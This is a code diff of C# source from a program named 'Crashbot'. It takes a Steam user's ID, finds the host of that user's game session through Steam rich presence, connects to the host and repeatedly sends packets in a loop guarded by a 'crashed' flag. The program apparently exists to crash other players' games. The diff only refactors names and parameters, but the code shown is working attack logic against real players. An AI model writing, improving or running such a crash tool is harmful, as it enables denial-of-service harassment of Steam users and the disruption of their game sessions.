@@ -70,15 +70,14 @@ namespace Crashbot
                 string steamid = Program.ReadSteamId();
                 if (string.IsNullOrEmpty(steamid))
                     continue;
-                ulong originalTarget = ulong.Parse(steamid);
 
                 // Initiate user information
-                CSteamID originalUser = new(originalTarget);
-                var (targetName, res) = Program.GetUsersName(originalUser);
-                Console.WriteLine($"[{DateTime.Now}] Targeting '{targetName}' = {res}");
+                CSteamID originalUserSteamid = new(ulong.Parse(steamid));
+                var (originalUserName, res) = Program.GetUsersName(originalUserSteamid);
+                Console.WriteLine($"[{DateTime.Now}] Targeting '{originalUserName}' = {res}");
 
                 // Check if the target is the host, if not, target the host
-                ulong hostTarget = Program.VerifyHostSteamid(originalUser, originalTarget);
+                ulong hostTarget = Program.VerifyHostSteamid(originalUserSteamid);
 
                 // Connect to the target
                 Console.WriteLine($"[{DateTime.Now}] Connecting...");
@@ -113,7 +112,7 @@ namespace Crashbot
                 int count = 1;
                 while (crashed)
                 {
-                    hostTarget = Program.VerifyHostSteamid(originalUser, originalTarget);
+                    hostTarget = Program.VerifyHostSteamid(originalUserSteamid);
                     var (conn_x, _) = Program.ConnectAndWait(hostTarget, LongTimeoutOptions);
                     Program.ReadOneAndSendOne(conn_x, 0, 0, 0);
                     Thread.Sleep(500);
@@ -161,7 +160,7 @@ namespace Crashbot
             return (targetName, res);
         }
 
-        private static ulong VerifyHostSteamid(CSteamID t, ulong original)
+        private static ulong VerifyHostSteamid(CSteamID t)
         {
             Steamworks.SteamFriends.RequestFriendRichPresence(t);
             Steamworks.SteamAPI.RunCallbacks();
@@ -182,14 +181,14 @@ namespace Crashbot
                 string host_id = connect.Split('-', StringSplitOptions.RemoveEmptyEntries).First().Split(' ', StringSplitOptions.RemoveEmptyEntries).Last();
                 ulong host_steamid = ulong.Parse(host_id);
 
-                if (original != host_steamid)
+                if (t.m_SteamID != host_steamid)
                 {
                     Console.WriteLine($"[{DateTime.Now}] Target is not host. Targeting: {host_steamid}");
                     return host_steamid;
                 }
             }
 
-            return original;
+            return t.m_SteamID;
         }
 
         private static (HSteamNetConnection Connection, SteamNetConnectionInfo_t Info) ConnectAndWait(ulong target, SteamNetworkingConfigValue_t[] options)
